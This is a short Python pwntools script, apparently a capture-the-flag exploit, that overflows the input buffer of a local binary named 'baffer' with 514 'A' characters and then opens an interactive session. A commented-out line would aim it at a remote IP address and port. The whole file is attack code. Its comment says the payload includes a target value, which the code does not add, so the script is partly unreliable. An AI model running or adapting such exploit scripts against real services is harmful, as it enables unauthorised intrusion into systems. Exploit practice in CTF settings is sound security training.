
#!/usr/bin/env python
from pwn import *
import sys

offset = int(514)

# The payload is a string of 'A' characters followed by the offset and the target value
payload = 'A' * offset 

# Send the payload to the program using a pipe
elf = process('./baffer')
ip = "103.181.143.135"
prt = 13372
#io = remote(ip,prt)
#print(payload)
elf.sendlineafter("Hell0 l33t, i'm baffer, please infut..",payload)
elf.interactive()
